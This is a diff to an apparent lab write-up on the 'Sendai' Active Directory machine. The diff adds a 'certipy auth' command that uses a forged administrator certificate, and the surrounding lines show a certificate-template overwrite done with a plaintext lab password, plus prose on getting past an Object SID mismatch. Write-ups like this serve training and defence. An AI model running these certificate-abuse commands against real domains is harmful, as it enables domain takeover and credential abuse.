@@ -227,6 +227,10 @@ certipy template -u clifford.davey -p 'RFmoB2WplgE_3p' -target DC.sendai.vl -dc-
 
 ![sendai-template-overwrite](/assets/img/sendai/sendai-template-overwrite.png)
 
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 10.129.7.193
+```
+
 Authentication fails — modern AD validates both the UPN and the Object SID embedded in the certificate. Without the correct SID, `certipy auth` returns "Object SID mismatch". Recover the Administrator SID:
 
 ```bash
